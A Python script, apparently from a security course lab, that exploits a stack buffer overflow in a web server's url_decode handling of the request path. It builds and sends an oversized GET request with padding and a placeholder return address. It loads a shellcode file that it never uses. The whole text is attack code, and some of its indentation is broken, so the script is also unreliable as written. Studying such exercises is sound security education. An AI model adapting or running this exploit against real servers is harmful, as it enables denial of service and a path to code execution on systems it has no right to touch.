#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

#Here I attempt to exploit the buffer char reqpath when it is used in https_request_line.
#In http.c, the call to "url_decode(reqpath, sp1);" may cause this overflow.
# The url_decode function will copy the target URI from the HTTP request into
# "reqpath" withoutany restriction on  size of "reqpath". The URI could be
# about 16000 bytes long and clearly overflow the buffer.




def build_exploit(shellcode):
    uri_prefix  = "/"
    padding     = (2048+20)-len(uri_prefix)
    return_addr = "BBBB"
    req = "GET " + uri_prefix + "S"*padding + return_addr + " HTTP/1.0\r\n" + "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	   resp = resp + rbuf
	   rbuf = sock.recv(1024)

     print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
